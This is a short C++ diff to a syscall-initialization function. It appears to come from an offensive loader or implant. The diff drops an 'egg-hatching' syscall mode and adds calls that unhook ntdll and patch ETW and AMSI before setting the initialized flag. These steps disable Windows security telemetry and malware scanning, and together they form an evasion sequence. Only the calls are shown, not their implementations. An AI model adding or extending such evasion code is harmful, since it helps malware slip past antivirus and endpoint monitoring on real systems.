@@ -48,12 +48,15 @@ public:
 	// ====================== Syscall ======================
 	BOOLEAN InitializeSyscalls() noexcept
 	{
-#ifdef EGG_MODE
-		if (!SC_Initialize() || !SC_HatchEggs())
+		SC_UnhookNtdll();
+
+		if (!SC_Initialize())
 		{
 			return false;
 		}
-#endif
+
+		SC_PatchEtw();
+		SC_PatchAmsi();
 
 		m_initialized = TRUE;
 		return TRUE;
